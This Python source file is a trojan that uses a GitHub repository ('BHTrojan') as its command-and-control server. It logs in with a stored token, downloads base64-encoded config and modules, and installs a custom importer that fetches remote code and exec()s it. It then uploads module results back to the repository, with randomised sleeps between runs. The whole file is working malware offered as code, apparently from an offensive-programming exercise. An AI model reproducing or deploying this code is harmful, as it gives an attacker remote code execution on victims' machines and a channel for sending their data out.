#!/usr/bin/python3

import base64
from github3 import login
import importlib
import json
import random
import sys
import time
import threading
import time
import os
import subprocess
from github3.exceptions import NotFoundError
from datetime import datetime
from typing import Any


def github_connect():

    """Get information through the console"""
    host = subprocess.check_output("whoami", stderr=subprocess.STDOUT, shell=True)
    host = host.decode().strip("\n")

    with open(f"/home/{host}/.token.txt") as f:
        token = f.read().strip("\n")

    user = "Arturo0911"
    gh = login(token=token)
    repo = gh.repository(user, "BHTrojan")
    # branch = gh.branch("master")
    # return gh.repository(user, "BHTrojan")
    return repo


def get_file_contents(dirname: str, module_name: str, repo: Any):
    # gh, repo, branch = github_connect()
    # tree = branch.commit.commit.tree.to_tree().recurse()
    return repo.file_contents(f'{dirname}/{module_name}').content


class Trojan:
    """The codebase gonna use the threading for make
    more efficent the push the settings"""

    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec('import %s' % task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner, args=(task['module'],)
                )
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(
            name, loader=None, origin=self.repo.git_url
        )
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


def main():
    try:
        sys.meta_path.append(GitImporter())
        trojan = Trojan('abc')
        trojan.run()
        # print(github_connect())
    except Exception as e:
        raise (e)
        print(str(e))


if __name__ == "__main__":
    main()
